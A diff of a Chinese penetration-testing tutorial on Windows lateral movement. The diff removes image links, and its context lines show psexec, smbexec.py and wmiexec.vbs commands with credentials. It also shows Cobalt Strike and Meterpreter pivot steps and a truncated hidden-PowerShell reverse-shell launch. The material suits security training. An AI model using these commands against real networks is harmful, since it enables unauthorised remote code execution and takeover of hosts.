@@ -35,7 +35,6 @@ psexec \\目标IP -s cmd.exe /accepteula
 ```
 参数说明：`-s`表示以`SYSTEM`权限运行，`/accepteula`用于自动接受许可协议。
 
-![](img/0b422fb9f26aa4358ebbcda4a0236550_1.png)
 
 **2. 执行单条命令**
 直接在命令后附加要执行的指令即可。
@@ -47,15 +46,11 @@ psexec \\目标IP -u administrator -p Password123 ipconfig
 
 ![](img/0b422fb9f26aa4358ebbcda4a0236550_3.png)
 
-![](img/0b422fb9f26aa4358ebbcda4a0236550_4.png)
 
-![](img/0b422fb9f26aa4358ebbcda4a0236550_5.png)
 
 ![](img/0b422fb9f26aa4358ebbcda4a0236550_6.png)
 
-![](img/0b422fb9f26aa4358ebbcda4a0236550_7.png)
 
-![](img/0b422fb9f26aa4358ebbcda4a0236550_8.png)
 
 **在Cobalt Strike中的注意事项**
 在Cobalt Strike的Beacon中执行`psexec`时，由于通信基于HTTP，无法直接获得交互式shell。我们的主要目的是在远程主机上执行反弹shell的命令。**注意：** 在Beacon中使用`psexec`传递命令时，**不要**用双引号包裹命令，否则会报“找不到文件”错误。
@@ -68,17 +63,14 @@ psexec \\192.168.1.100 -u domain\user -p pass -s cmd.exe /c powershell -nop -w h
 
 ![](img/0b422fb9f26aa4358ebbcda4a0236550_11.png)
 
-![](img/0b422fb9f26aa4358ebbcda4a0236550_13.png)
 
 ### smbexec工具介绍
 
-![](img/0b422fb9f26aa4358ebbcda4a0236550_15.png)
 
 ![](img/0b422fb9f26aa4358ebbcda4a0236550_17.png)
 
 ![](img/0b422fb9f26aa4358ebbcda4a0236550_19.png)
 
-![](img/0b422fb9f26aa4358ebbcda4a0236550_20.png)
 
 `smbexec`是基于`psexec`原理的测试工具，属于`impacket`工具套件的一部分。它的使用格式和效果与`psexec`类似。
 
@@ -86,7 +78,6 @@ psexec \\192.168.1.100 -u domain\user -p pass -s cmd.exe /c powershell -nop -w h
 
 ![](img/0b422fb9f26aa4358ebbcda4a0236550_24.png)
 
-![](img/0b422fb9f26aa4358ebbcda4a0236550_25.png)
 
 ![](img/0b422fb9f26aa4358ebbcda4a0236550_27.png)
 
@@ -96,11 +87,9 @@ smbexec.py 域名/用户名:密码@目标IP
 ```
 执行后，同样会建立连接、上传服务、执行命令并清理痕迹。
 
-![](img/0b422fb9f26aa4358ebbcda4a0236550_29.png)
 
 ![](img/0b422fb9f26aa4358ebbcda4a0236550_31.png)
 
-![](img/0b422fb9f26aa4358ebbcda4a0236550_33.png)
 
 ![](img/0b422fb9f26aa4358ebbcda4a0236550_34.png)
 
@@ -117,15 +106,12 @@ Impacket项目提供了多种内网渗透脚本，包括`psexec.py`和`smbexec.p
 
 ![](img/0b422fb9f26aa4358ebbcda4a0236550_42.png)
 
-![](img/0b422fb9f26aa4358ebbcda4a0236550_44.png)
 
 ![](img/0b422fb9f26aa4358ebbcda4a0236550_46.png)
 
 ---
 
-![](img/0b422fb9f26aa4358ebbcda4a0236550_48.png)
 
-![](img/0b422fb9f26aa4358ebbcda4a0236550_50.png)
 
 ![](img/0b422fb9f26aa4358ebbcda4a0236550_51.png)
 
@@ -159,11 +145,8 @@ cscript.exe //nologo wmiexec.vbs /shell 用户名 密码 目标IP
 
 ![](img/0b422fb9f26aa4358ebbcda4a0236550_53.png)
 
-![](img/0b422fb9f26aa4358ebbcda4a0236550_55.png)
 
-![](img/0b422fb9f26aa4358ebbcda4a0236550_57.png)
 
-![](img/0b422fb9f26aa4358ebbcda4a0236550_58.png)
 
 ## 第三部分：Metasploit与Cobalt Strike中的横向移动
 
@@ -175,24 +158,18 @@ cscript.exe //nologo wmiexec.vbs /shell 用户名 密码 目标IP
 
 ![](img/0b422fb9f26aa4358ebbcda4a0236550_62.png)
 
-![](img/0b422fb9f26aa4358ebbcda4a0236550_64.png)
 
-![](img/0b422fb9f26aa4358ebbcda4a0236550_66.png)
 
-![](img/0b422fb9f26aa4358ebbcda4a0236550_67.png)
 
 1.  获取一个跳板机的Meterpreter会话。
 2.  通过`upload`命令将`psexec.exe`等工具上传到跳板机。
 3.  进入跳板机的shell环境（`shell`命令）。
 4.  在跳板机的shell中执行横向移动命令，攻击内网其他主机。
 
-![](img/0b422fb9f26aa4358ebbcda4a0236550_69.png)
 
-![](img/0b422fb9f26aa4358ebbcda4a0236550_71.png)
 
 ### 在Cobalt Strike中操作
 
-![](img/0b422fb9f26aa4358ebbcda4a0236550_73.png)
 
 ![](img/0b422fb9f26aa4358ebbcda4a0236550_75.png)
 
@@ -225,11 +202,9 @@ cscript.exe //nologo wmiexec.vbs /shell 用户名 密码 目标IP
 
 ![](img/0b422fb9f26aa4358ebbcda4a0236550_91.png)
 
-![](img/0b422fb9f26aa4358ebbcda4a0236550_93.png)
 
 ---
 
-![](img/0b422fb9f26aa4358ebbcda4a0236550_95.png)
 
 ## 总结 🎯
 
@@ -239,7 +214,6 @@ cscript.exe //nologo wmiexec.vbs /shell 用户名 密码 目标IP
 *   我们探讨了如何在Metasploit和Cobalt Strike两大渗透框架中，结合这些工具进行高效的横向移动。
 *   最后，我们简要介绍了利用RDP协议的`SharpRDP`工具。
 
-![](img/0b422fb9f26aa4358ebbcda4a0236550_97.png)
 
 ![](img/0b422fb9f26aa4358ebbcda4a0236550_98.png)
 
